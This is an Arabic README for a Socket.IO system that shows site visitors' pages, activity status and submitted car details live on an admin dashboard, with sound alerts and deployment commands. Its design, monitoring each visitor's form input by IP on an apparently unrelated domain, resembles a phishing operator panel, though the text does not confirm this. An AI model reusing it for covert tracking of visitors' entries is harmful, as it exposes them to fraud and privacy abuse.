# 📡 نظام التتبع الفوري Real-Time Tracking System

## نظرة عامة
نظام متكامل لتتبع نشاط العملاء في الوقت الفعلي على صفحة الأدمن باستخدام **WebSockets (Socket.IO)**.

---

## ✨ الميزات المُنفذة

### 1️⃣ **تتبع المسار التلقائي** 📍
- **عند دخول العميل** إلى أي صفحة (مثل `/car-details`):
  - يتم إرسال حدث `pageChange` للخادم فوراً
  - يظهر العميل في جدول الأدمن مع الصفحة الحالية
  - التحديث تلقائي **بدون refresh**

**الكود - Frontend** (`SocketContext.jsx`):
```javascript
socket.emit('pageChange', { 
  ip: userIp, 
  page: currentPage,
  timestamp: new Date().toISOString()
});
```

**الكود - Backend** (`server.js`):
```javascript
socket.on('pageChange', ({ ip, page, timestamp, status }) => {
  // تحديث customerEntries
  // بث الحدث: io.emit('locationUpdated', ...)
  // بث القائمة: io.emit('customersUpdate', customerEntries)
});
```

---

### 2️⃣ **تتبع حالة النشاط** 🟢🔴
- **نشط (Active)**: العميل موجود على الموقع
- **غير نشط (Inactive)**: العميل غادر الموقع

**الكود - Frontend** (`SocketContext.jsx`):
```javascript
window.addEventListener('beforeunload', () => {
  socket.emit('pageChange', {
    ip: userIp,
    page: 'OFFLINE',
    status: 'INACTIVE',
    timestamp: new Date().toISOString()
  });
});
```

**النتيجة**: 
- عند إغلاق التبويب → الحالة تتحول لـ "غير نشط" فوراً
- عند العودة → الحالة تعود لـ "نشط"

---

### 3️⃣ **تحديث بيانات السيارة فوراً** 🚗
عند ضغط العميل على "متابعة" بعد إدخال بيانات السيارة:

**Frontend** (`CarDetails.jsx`):
```javascript
socket.emit('submitCarDetails', {
  ip: userIp,
  vehicleType: 'سيارة',
  brand: formData.make,
  model: formData.model,
  year: formData.year,
  seats: formData.seats,
  cylinders: formData.cylinders
});
```

**Backend** (`server.js`):
```javascript
socket.on('submitCarDetails', (data) => {
  // تحديث customerEntries ببيانات السيارة
  // نقل العميل للأعلى: customerEntries.unshift(customer)
  // بث الحدث: io.emit('carDetailsUpdated', {...})
});
```

---

### 4️⃣ **التنبيه الصوتي** 🔊
عند إدخال بيانات جديدة، يتم:
- تشغيل صوت تنبيه (`data.wav`)
- إظهار badge على أيقونة الأدمن لمدة 5 ثواني

**الكود - AdminDashboard**:
```javascript
socket.on('carDetailsUpdated', ({ ip, carDetails, playSound }) => {
  if (playSound) {
    playCarDataSound();  // 🔊 تشغيل الصوت
    setNewDataCount(prev => prev + 1);
  }
});
```

**ملف الصوت**: `/assets/sounds/data.wav`

---

### 5️⃣ **رفع العميل للأعلى** ⬆️
عند إدخال بيانات جديدة:
- يتم **إزالة** صف العميل من موقعه الحالي
- يتم **إضافته** في **أول القائمة** (أعلى الجدول)
- النتيجة: أحدث نشاط دائماً في الأعلى

**الكود**:
```javascript
// Backend
const customer = customerEntries.splice(customerIndex, 1)[0];
customerEntries.unshift(customer);

// Frontend
const newList = [...prev];
newList.splice(customerIndex, 1);
newList.unshift(updatedCustomer);
```

---

## 🔄 تدفق البيانات (Data Flow)

```
📱 العميل (Client)
    ↓
    emit: pageChange / submitCarDetails
    ↓
🖥️ الخادم (Backend)
    ↓
    تحديث: customerEntries, locationsData
    ↓
    broadcast: locationUpdated / carDetailsUpdated
    ↓
👨‍💼 الأدمن (Admin Dashboard)
    ↓
    on: carDetailsUpdated
    ↓
    ✅ تحديث الجدول + 🔊 تشغيل الصوت + ⬆️ رفع الصف
```

---

## 📋 الأحداث (Events)

### من العميل → الخادم
| الحدث | البيانات | الوصف |
|-------|---------|-------|
| `pageChange` | `{ ip, page, timestamp, status }` | تغيير المسار |
| `submitCarDetails` | `{ ip, brand, model, year, ... }` | إرسال بيانات السيارة |

### من الخادم → الأدمن
| الحدث | البيانات | الوصف |
|-------|---------|-------|
| `locationUpdated` | `{ ip, page, timestamp, status }` | تحديث موقع العميل |
| `customersUpdate` | `customerEntries[]` | قائمة العملاء الكاملة |
| `carDetailsUpdated` | `{ ip, carDetails, playSound }` | بيانات سيارة جديدة |
| `userConnected` | `{ ip }` | عميل اتصل |
| `userDisconnected` | `{ ip }` | عميل انقطع |

---

## 🎯 التحسينات المطبقة

1. ✅ **Dual-Listener Pattern**: 
   - `locationUpdated` للتحديثات السريعة
   - `customersUpdate` للمزامنة الشاملة

2. ✅ **Redundancy Layers**:
   - Socket events (فوري)
   - 5-second polling (احتياطي)

3. ✅ **Smart Sorting**:
   - الترتيب حسب `lastUpdate`
   - الأحدث دائماً في الأعلى

4. ✅ **Sound Notifications**:
   - ملفات WAV احترافية
   - Fallback لـ Web Audio API

---

## 🧪 كيفية الاختبار

### السيناريو 1: تتبع المسار
1. افتح https://ielts.sbs في متصفح
2. افتح https://ielts.sbs/admin في متصفح آخر
3. انتقل بين الصفحات → ✅ يجب أن يتحدث "الصفحة الحالية" فوراً

### السيناريو 2: بيانات السيارة
1. في صفحة العميل: ادخل إلى `/car-details`
2. املأ البيانات واضغط "متابعة"
3. في صفحة الأدمن: 
   - ✅ تشغيل صوت
   - ✅ ظهور badge
   - ✅ العميل يرتفع للأعلى
   - ✅ بيانات السيارة تظهر في الجدول

### السيناريو 3: حالة النشاط
1. أغلق تبويب العميل → ✅ الحالة تتحول لـ "غير نشط"
2. افتح التبويب مجدداً → ✅ الحالة تعود لـ "نشط"

---

## 📁 الملفات المعدلة

| الملف | التعديلات |
|------|----------|
| `backend/server.js` | إضافة `carDetailsUpdated` event + معالجة OFFLINE |
| `frontend/src/context/SocketContext.jsx` | إضافة `beforeunload` handler |
| `frontend/src/pages/AdminDashboard.jsx` | إضافة `carDetailsUpdated` listener |
| `frontend/src/utils/notificationSounds.js` | إضافة `playCarDataSound()` |

---

## 🚀 النشر

```bash
# 1. بناء Frontend
npm run build

# 2. رفع للـ Git
git add -A
git commit -m "feat: Real-time tracking improvements"
git push origin main

# 3. نشر على السيرفر
ssh root@194.164.72.37 "cd /var/www/qiic && git pull && cd frontend && npm run build && pm2 restart qiic-backend"
```

---

## 🎉 النتيجة النهائية

✅ **تتبع فوري** للعملاء على صفحة الأدمن  
✅ **تحديث تلقائي** بدون refresh  
✅ **تنبيهات صوتية** عند إدخال بيانات جديدة  
✅ **ترتيب ذكي** - الأحدث في الأعلى  
✅ **تتبع النشاط** - نشط/غير نشط  

---

**🔗 الموقع المباشر**: https://ielts.sbs  
**📅 آخر تحديث**: 2025-11-20  
**🆔 Commit**: `61ce724`
